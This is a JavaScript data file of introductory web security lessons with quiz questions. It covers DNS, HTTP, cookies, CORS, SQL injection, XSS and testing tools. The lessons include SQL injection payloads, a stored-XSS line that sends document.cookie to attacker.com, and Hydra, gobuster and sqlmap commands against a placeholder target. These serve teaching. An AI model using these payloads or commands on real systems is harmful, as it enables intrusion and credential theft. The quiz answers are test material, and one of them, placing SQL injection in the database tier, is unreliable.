const LESSONS = [
  {
    title: "How the Web Works (DNS & IP)",
    points: 10,
    content: `Before attacking or defending web applications, you must understand how they communicate over the Internet.

IP ADDRESSES:
Every device connected to the Internet has an IP address — a unique numerical label that identifies it on a network.
  IPv4: 192.168.1.1  (32-bit, ~4 billion addresses)
  IPv6: 2001:db8::1  (128-bit, virtually unlimited addresses)
Computers use these numbers to route data to the correct destination. Humans use domain names instead.

DOMAIN NAME SYSTEM (DNS):
DNS is the Internet's phonebook — it translates human-readable domain names (like google.com) into machine-readable IP addresses.

THE FULL DNS RESOLUTION PROCESS:
1. You type "google.com" into your browser.
2. Browser checks its local cache — if not found, asks the OS resolver.
3. OS asks your ISP's Recursive Resolver.
4. Recursive Resolver queries the Root DNS Server → Top-Level Domain (TLD) server (.com) → Authoritative Name Server for google.com.
5. Authoritative server returns the IP address (e.g., 142.250.80.46).
6. Your browser connects directly to that IP.

KEY DNS RECORD TYPES:
  A Record:      Maps a domain to an IPv4 address.
  AAAA Record:   Maps a domain to an IPv6 address.
  CNAME Record:  Alias — points one domain to another domain.
  MX Record:     Mail server for the domain.
  TXT Record:    Text data (used for SPF, DKIM email verification).

DNS RECONNAISSANCE (Hacker Perspective):
Attackers query DNS to find subdomains (dev.target.com, admin.target.com) that expose additional attack surfaces.
Tools: nslookup, dig, Sublist3r, Amass.
Example: dig any target.com  (dumps all DNS records)`,
    questions: [
      { q: "What system translates domain names into IP addresses?", a: "DNS" },
      { q: "What does an IP address primarily do on the Internet?", a: "Routes data to the correct destination" },
      { q: "What process involves finding subdomains of a target domain?", a: "DNS Reconnaissance" },
      { q: "What DNS record type maps a domain name to an IPv4 address?", a: "A Record" },
      { q: "What tool can be used to query DNS records from the command line?", a: "nslookup (or dig)" }
    ]
  },
  {
    title: "Web Application Architecture",
    points: 10,
    content: `Modern web applications are split into multiple layers. Understanding this architecture is critical for identifying where vulnerabilities live.

THE 3-TIER ARCHITECTURE:

1. THE CLIENT (Frontend / Presentation Layer):
This is what the user sees and interacts with. It runs in the web browser using HTML (structure), CSS (styling), and JavaScript (behavior). Vulnerabilities here affect users directly.
  Attack examples: XSS, Clickjacking, DOM manipulation.

2. THE SERVER (Backend / Application Layer):
The brain of the application. It processes requests, runs business logic, authenticates users, and interacts with the database. Common languages: Python, Node.js, PHP, Java, Ruby.
  Attack examples: Command Injection, Server-Side Request Forgery (SSRF), Insecure Direct Object Reference (IDOR).

3. THE DATABASE (Data Layer):
Stores all persistent data — user accounts, passwords, transactions, content. Common databases: MySQL, PostgreSQL, MongoDB, SQLite.
  Attack examples: SQL Injection, NoSQL Injection, data exfiltration.

ADDITIONAL COMPONENTS:
  Web Server:      Handles HTTP requests (Apache, Nginx, IIS).
  Load Balancer:   Distributes traffic across multiple servers.
  CDN:             Caches and delivers static content globally (Cloudflare, AWS CloudFront).
  API Layer:       REST or GraphQL endpoints for data exchange.

WHY ARCHITECTURE MATTERS FOR SECURITY:
  A vulnerability in the client affects one user.
  A vulnerability in the server can affect all users.
  A vulnerability in the database can expose every record ever stored.
Understanding where a vulnerability lives tells you how to exploit AND how to patch it.`,
    questions: [
      { q: "Which tier runs in the user's web browser?", a: "The Client (or Frontend)" },
      { q: "Which tier processes requests and executes business logic?", a: "The Server (or Backend)" },
      { q: "In which tier does SQL Injection typically occur?", a: "The Database" },
      { q: "What web server software is commonly used to handle HTTP requests?", a: "Apache (or Nginx, IIS)" },
      { q: "What is the name for a vulnerability where a user can access another user's data by changing an ID in the URL?", a: "IDOR (Insecure Direct Object Reference)" }
    ]
  },
  {
    title: "HTTP & HTTPS — How Browsers Talk to Servers",
    points: 10,
    content: `The web operates on HTTP (Hypertext Transfer Protocol), which defines how browsers and servers communicate.

HTTP REQUEST STRUCTURE:
Every time you visit a page, your browser sends a request:
  GET /login HTTP/1.1
  Host: target.com
  Cookie: session=abc123
  User-Agent: Mozilla/5.0 ...

HTTP RESPONSE STRUCTURE:
The server replies with:
  HTTP/1.1 200 OK
  Content-Type: text/html
  Set-Cookie: session=xyz789

COMMON HTTP METHODS:
  GET:     Retrieve data (URL parameters visible in logs).
  POST:    Submit data (body is hidden, but not encrypted without HTTPS).
  PUT:     Replace a resource entirely.
  PATCH:   Partially update a resource.
  DELETE:  Remove a resource.

COMMON HTTP STATUS CODES:
  200 OK:            Request succeeded.
  301/302 Redirect:  Resource moved.
  400 Bad Request:   Malformed request.
  401 Unauthorized:  Authentication required.
  403 Forbidden:     Authenticated but not authorized.
  404 Not Found:     Resource doesn't exist.
  500 Internal Server Error: Server crashed — often reveals debug info.

THE PROBLEM WITH HTTP:
Basic HTTP sends all data in plain text. A Man-in-the-Middle (MitM) attacker intercepting the traffic can read passwords, session cookies, and personal messages.

THE SOLUTION — HTTPS:
HTTPS uses TLS (Transport Layer Security) to encrypt all communication between client and server. Even if intercepted, the data appears as scrambled ciphertext. Modern browsers display a padlock icon for HTTPS sites and warn users about HTTP-only pages.

SECURITY HEADERS:
Servers can include protective HTTP headers:
  Strict-Transport-Security: Forces browsers to use HTTPS only.
  X-Content-Type-Options:    Prevents MIME-type sniffing attacks.
  X-Frame-Options:           Blocks Clickjacking (prevents site being loaded in iframes).`,
    questions: [
      { q: "What protocol encrypts data between the client and server?", a: "HTTPS (or TLS)" },
      { q: "What HTTP method is used to retrieve data from a server?", a: "GET" },
      { q: "What cookie flag prevents JavaScript from accessing the cookie?", a: "HttpOnly" },
      { q: "What kind of attack intercepts communication between two parties?", a: "Man-in-the-Middle (MitM)" },
      { q: "What HTTP status code means the server encountered an internal error?", a: "500" }
    ]
  },
  {
    title: "Sessions, Cookies & Authentication",
    points: 10,
    content: `HTTP is a stateless protocol — each request is completely independent. The server doesn't inherently remember you between page loads. Sessions and cookies solve this problem.

COOKIES:
Cookies are small pieces of data sent by the server and stored in the browser. The browser automatically sends them back with every subsequent request to that domain.
  Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

SESSION FLOW:
1. User submits login form with credentials.
2. Server validates credentials and creates a unique Session ID.
3. Server sends Session ID to browser in a Set-Cookie header.
4. Browser stores it and sends it with every future request.
5. Server looks up the Session ID in its database to identify the user.

COOKIE SECURITY FLAGS:
  HttpOnly:  Prevents JavaScript from reading the cookie (stops XSS cookie theft).
  Secure:    Cookie is only sent over HTTPS, never over plain HTTP.
  SameSite:  Controls whether cookie is sent with cross-site requests.
    - Strict: Never sent cross-site.
    - Lax:    Sent with top-level navigation only.
    - None:   Always sent (requires Secure flag).

SECURITY RISKS:
  Session Hijacking: Attacker steals the Session ID cookie and uses it to impersonate the victim. The server cannot tell the difference — it just sees a valid Session ID.
  Session Fixation: Attacker forces a victim to use a Session ID the attacker already knows, then authenticates as the victim.
  Cookie Tampering: If cookies store data like role=user, attackers might try role=admin.

JWT (JSON WEB TOKENS):
A modern alternative to session cookies. The server issues a cryptographically signed token containing the user's data. The client stores it and sends it with each request. Since it's signed, tampering is detectable — unless the algorithm is set to "none" (a known vulnerability).`,
    questions: [
      { q: "Why does HTTP need cookies to remember users?", a: "Because HTTP is a stateless protocol" },
      { q: "What unique value identifies an authenticated user across multiple requests?", a: "Session ID" },
      { q: "What happens if an attacker steals a user's session cookie?", a: "Session Hijacking" },
      { q: "What cookie flag ensures it is only sent over HTTPS?", a: "Secure" },
      { q: "What modern token-based authentication format uses cryptographic signatures instead of server-side sessions?", a: "JWT (JSON Web Token)" }
    ]
  },
  {
    title: "Same-Origin Policy (SOP) & CORS",
    points: 10,
    content: `The Same-Origin Policy (SOP) is one of the most important security mechanisms built into web browsers.

WHAT IS SOP?
SOP prevents a malicious script on one website (attacker.com) from reading sensitive data on another website (bank.com) that the user is logged into.
Two URLs share the same origin only if ALL THREE match:
  - Protocol (http vs https)
  - Host (domain name)
  - Port (80, 443, 8080, etc.)

SOP EXAMPLES:
  http://site.com/page1    and  http://site.com/page2  → SAME origin ✅
  http://site.com          and  https://site.com        → DIFFERENT (protocol) ❌
  http://site.com          and  http://api.site.com     → DIFFERENT (host) ❌
  http://site.com          and  http://site.com:8080    → DIFFERENT (port) ❌

CROSS-ORIGIN RESOURCE SHARING (CORS):
Sometimes, legitimate apps need to request data across origins (e.g., frontend on app.com calling an API on api.com). CORS allows servers to selectively relax SOP using HTTP headers:
  Access-Control-Allow-Origin: https://trusted-app.com
  Access-Control-Allow-Methods: GET, POST
  Access-Control-Allow-Headers: Content-Type

CORS MISCONFIGURATION (Critical Vulnerability):
If a server trusts any origin:
  Access-Control-Allow-Origin: *
  or dynamically echoes back the request's Origin header, an attacker's site can silently make authenticated requests to the target and read the responses.

PREFLIGHT REQUESTS:
For non-simple requests (POST with JSON, custom headers), the browser sends an HTTP OPTIONS "preflight" request first to check if CORS is permitted. Only if the server approves does the browser send the real request.

CLICKJACKING (Related Attack):
Embeds the target site inside a hidden iframe on the attacker's page. Users think they're clicking a button on attacker.com but are actually clicking on bank.com's "Transfer Funds" button underneath.
Defense: X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'.`,
    questions: [
      { q: "What browser policy prevents scripts from one site from reading data on another?", a: "Same-Origin Policy (SOP)" },
      { q: "What three components make up an origin?", a: "Protocol, Port, and Host" },
      { q: "What mechanism allows servers to selectively relax the SOP for trusted origins?", a: "CORS (Cross-Origin Resource Sharing)" },
      { q: "What CORS header value makes a server vulnerable to cross-origin data theft?", a: "Access-Control-Allow-Origin: * (or echoing back any origin)" },
      { q: "What attack embeds a target website inside a hidden iframe to trick users into clicking its elements?", a: "Clickjacking" }
    ]
  },
  {
    title: "Core Concepts & Importance of Web Security",
    points: 10,
    content: `Web Security is the practice of protecting websites, web applications, and APIs from malicious attacks, unauthorized access, and data breaches.

WHY IT MATTERS:
As our lives move online, web applications handle highly sensitive data — personal information, financial records, medical histories. A breach can lead to:
  - Financial loss (stolen credit cards, ransomware, fraud)
  - Reputational damage for businesses
  - Legal consequences (GDPR fines up to 4% of global revenue, CCPA penalties)
  - Loss of user trust — often permanently

SCALE OF THE PROBLEM:
  - Data breaches exposed over 22 billion records in 2023 alone.
  - The average cost of a data breach is $4.45 million (IBM Security Report, 2023).
  - Web application attacks account for over 26% of all breaches (Verizon DBIR).

THE CIA TRIAD:
The foundation of information security rests on three core principles:
  1. Confidentiality: Ensuring data is accessible only to authorized users.
     Example control: Encryption, access controls.
  2. Integrity: Ensuring data is accurate and unaltered by unauthorized parties.
     Example control: Digital signatures, checksums, audit logs.
  3. Availability: Ensuring systems and data are accessible when needed.
     Example attack: DDoS (Distributed Denial of Service).

BEYOND CIA — ADDITIONAL PRINCIPLES:
  Authentication: Verifying who you are (username + password, MFA).
  Authorization:  Verifying what you're allowed to do (role-based access control).
  Non-repudiation: Proving that an action was performed by a specific party (audit trails, digital signatures).

DEFENSE IN DEPTH:
No single security control is perfect. Effective security uses multiple overlapping layers so that if one fails, others remain. This is called Defense in Depth.`,
    questions: [
      { q: "What does the 'C' in the CIA Triad stand for?", a: "Confidentiality" },
      { q: "Ensuring data is accurate and unaltered is known as what?", a: "Integrity" },
      { q: "What principle ensures systems are accessible when needed?", a: "Availability" },
      { q: "What attack on Availability floods a server with traffic to take it offline?", a: "DDoS (Distributed Denial of Service)" },
      { q: "What security strategy uses multiple overlapping layers of defense?", a: "Defense in Depth" }
    ]
  },
  {
    title: "Common Attack: SQL Injection (SQLi)",
    points: 10,
    content: `SQL Injection is one of the most critical and oldest web vulnerabilities — ranked #3 in the OWASP Top 10. It occurs when user input is unsafely embedded into a database query.

HOW IT WORKS:
Imagine a login query built by concatenating user input:
  "SELECT * FROM users WHERE username = '" + user_input + "' AND password = '" + pass_input + "'"

If an attacker enters: admin' --
The query becomes:
  SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
The -- comments out the password check, logging the attacker in as admin without knowing the password.

CLASSIC PAYLOADS:
  admin' --         → Comment out password check
  ' OR '1'='1' --   → Always-true condition (returns all rows)
  ' OR 1=1 --       → Auth bypass shorthand
  ' UNION SELECT 1,username,password FROM users --  → Steal credentials

TYPES OF SQLi:
  In-band SQLi:   Results returned directly in the HTTP response.
    - UNION-based: Extract data via UNION SELECT.
    - Error-based: Extract data from database error messages.
  Blind SQLi:     No data returned; inferred from behavior.
    - Boolean-based: Different responses for TRUE vs FALSE.
    - Time-based: Delay function (SLEEP) confirms TRUE condition.
  Out-of-Band SQLi: Data exfiltrated via DNS or HTTP to attacker's server.

IMPACT:
  - Bypassing authentication (log in as any user)
  - Reading sensitive database contents (users, credit cards)
  - Modifying or deleting data
  - Sometimes achieving Remote Code Execution (RCE) via xp_cmdshell (MSSQL) or LOAD_FILE (MySQL)

DEFENSE:
  #1: Parameterized Queries / Prepared Statements — treat user input as data, never as code.
  #2: Least privilege DB accounts — web app user should only SELECT/INSERT, never DROP.
  #3: Disable verbose error messages in production.`,
    questions: [
      { q: "What type of attack manipulates database queries?", a: "SQL Injection" },
      { q: "What characters are commonly used to comment out the rest of a SQL query in ANSI SQL?", a: "--" },
      { q: "What is the primary defense against SQL Injection?", a: "Parameterized Queries (Prepared Statements)" },
      { q: "What type of SQLi uses SLEEP() to infer data when no output is visible?", a: "Time-based Blind SQLi" },
      { q: "What principle limits the database account's permissions to prevent DROP and RCE attacks?", a: "Least Privilege" }
    ]
  },
  {
    title: "Common Attack: Cross-Site Scripting (XSS)",
    points: 10,
    content: `Cross-Site Scripting (XSS) happens when a web application includes untrusted user data in a web page without proper validation or output encoding. The browser executes the injected script as if it were legitimate code.

HOW IT WORKS:
An attacker injects malicious JavaScript into a website. When a victim visits the page, their browser executes the script in the context of that trusted domain.

TYPES OF XSS:
  1. Reflected XSS (Non-Persistent):
     The payload is in the HTTP request (URL parameter). The server immediately reflects it in the response.
     Example: http://site.com/search?q=<script>alert(1)</script>
     Delivery: Phishing emails, malicious links.

  2. Stored XSS (Persistent):
     The payload is permanently saved on the server (in a comment, profile, or forum post) and served to every user who visits that page. Much more dangerous — no user interaction beyond visiting the page.
     Example: Attacker posts a comment: <script>fetch('http://attacker.com?c='+document.cookie)</script>

  3. DOM-based XSS:
     The vulnerability is in the client-side JavaScript, not the server code. The payload flows from a Source (e.g., window.location.hash) to a Sink (e.g., innerHTML) entirely in the browser.

WHAT ATTACKERS CAN DO WITH XSS:
  - Steal session cookies → Account takeover (Session Hijacking)
  - Inject fake login forms → Credential phishing
  - Redirect users to malicious sites
  - Keylog all keystrokes on the page
  - Spread XSS worms on social networks (Samy Worm, 2005)

IMPACT SCALE:
  XSS is the #2 most reported bug in bug bounty programs (HackerOne 2023).

DEFENSE:
  Output Encoding: Escape < > " ' & before rendering user data in HTML.
  Content Security Policy (CSP): HTTP header that blocks unauthorized scripts.
  HttpOnly cookies: Prevents scripts from reading session tokens.`,
    questions: [
      { q: "What type of attack injects malicious JavaScript into a webpage?", a: "Cross-Site Scripting (XSS)" },
      { q: "Which type of XSS permanently saves the payload on the server?", a: "Stored XSS" },
      { q: "What is a common goal of an XSS attack regarding user sessions?", a: "Stealing session cookies (Session Hijacking)" },
      { q: "What HTTP header restricts which scripts the browser is allowed to execute?", a: "Content Security Policy (CSP)" },
      { q: "In DOM-based XSS, what is the term for a dangerous function that processes untrusted data (e.g., innerHTML)?", a: "Sink" }
    ]
  },
  {
    title: "Common Attack: Brute Force & Authentication Flaws",
    points: 10,
    content: `Authentication mechanisms are the front door to web applications. Attackers frequently target them to gain unauthorized access.

BRUTE FORCE ATTACKS:
A brute force attack systematically submits many passwords with the hope of eventually guessing correctly.

VARIATIONS:
  Simple Brute Force:  Tries every character combination (a, b, c... aa, ab...).
  Dictionary Attack:   Uses a wordlist of common passwords (RockYou.txt has 14M+ entries).
  Credential Stuffing: Uses stolen username/password pairs from breached sites on other sites. Relies on password reuse — affecting ~65% of users (Google, 2019).
  Password Spraying:   Tries one common password (e.g., "Welcome1!") against thousands of accounts to avoid lockouts.
  Hybrid Attack:       Combines dictionary words with numbers/symbols (football → football2024!).

HOW TOOLS WORK:
  Hydra: Automated tool supporting HTTP, SSH, FTP, and 50+ other protocols.
    hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
  Burp Suite Intruder: Web-specific tool for credential attacks on custom login forms.

IMPACT:
  Account takeover → Data theft, unauthorized transactions, lateral movement within an organization.

DEFENSE — LAYERED APPROACH:
  1. Strong Passwords:       12+ characters, no common words. Use a password manager.
  2. Multi-Factor Auth (MFA): Second factor stops attackers even if password is known. Blocks 99.9% of automated attacks (Microsoft).
  3. Rate Limiting:           Max 10 login attempts per minute per IP.
  4. Account Lockout:         Lock after 5 failed attempts.
  5. CAPTCHA:                 Blocks automated scripts.
  6. Breach Monitoring:       Check passwords against Have I Been Pwned (HIBP) database.`,
    questions: [
      { q: "What attack tries many different passwords to guess the correct one?", a: "Brute Force" },
      { q: "What attack uses leaked username and password pairs from other breaches?", a: "Credential Stuffing" },
      { q: "What defense mechanism limits the number of login attempts per IP?", a: "Rate Limiting" },
      { q: "What does MFA stand for?", a: "Multi-Factor Authentication" },
      { q: "What famous wordlist containing 14 million passwords is commonly used in dictionary attacks?", a: "RockYou.txt" }
    ]
  },
  {
    title: "Web Security Testing & Tools",
    points: 10,
    content: `To find and fix vulnerabilities, security professionals use specialized tools to inspect and manipulate web traffic. Always obtain written authorization before testing any system!

WEB PROXIES — BURP SUITE:
A web proxy sits between your browser and the target server, intercepting all HTTP/HTTPS requests. You can view, modify, replay, and fuzz them before they reach the server.

Burp Suite (by PortSwigger) is the industry standard. Key modules:
  Proxy:      Intercepts and logs all browser traffic in real time.
  Repeater:   Manually modify a captured request and resend it repeatedly.
  Intruder:   Automate attacks — brute force, parameter fuzzing, credential stuffing.
  Scanner:    (Pro only) Automated vulnerability scanning.
  Decoder:    Encode/decode data (Base64, URL, HTML entities, hex).
  Comparer:   Diff two responses to spot behavioral differences (useful for blind SQLi).

OWASP ZAP (Zed Attack Proxy):
Free and open-source alternative to Burp Suite. Excellent for beginners and CI/CD pipeline integration.

DIRECTORY & ENDPOINT DISCOVERY:
  Gobuster:   Brute-forces hidden directories, files, and vhosts.
    gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
  Dirsearch:  Similar tool with more features and output formats.
  ffuf:       Extremely fast fuzzer for directories, parameters, and headers.

VULNERABILITY SCANNERS:
  SQLMap:     Automates detection and exploitation of SQL injection.
    sqlmap -u "http://target.com/item?id=1" --dbs
  Nikto:      Web server scanner — finds misconfigurations, outdated software, default files.
  Nuclei:     Template-based scanner covering thousands of known vulnerability patterns.

BROWSER DEVELOPER TOOLS:
Built into every browser (F12). Key tabs for security testing:
  Network:    See all HTTP requests/responses, headers, cookies.
  Console:    Execute JavaScript — great for testing DOM XSS.
  Application: Inspect cookies, localStorage, sessionStorage.
  Sources:    View JavaScript source code for logic flaws.`,
    questions: [
      { q: "What tool intercepts traffic between a browser and a server?", a: "Web Proxy (or Burp Suite)" },
      { q: "What Burp Suite module allows you to manually modify and resend requests?", a: "Repeater" },
      { q: "What tool automates the detection and exploitation of SQL injection?", a: "SQLMap" },
      { q: "What Burp Suite module is used to automate attacks like brute force on login forms?", a: "Intruder" },
      { q: "What browser built-in tool (opened with F12) lets you inspect cookies, HTTP requests, and JavaScript?", a: "Developer Tools" }
    ]
  }
];
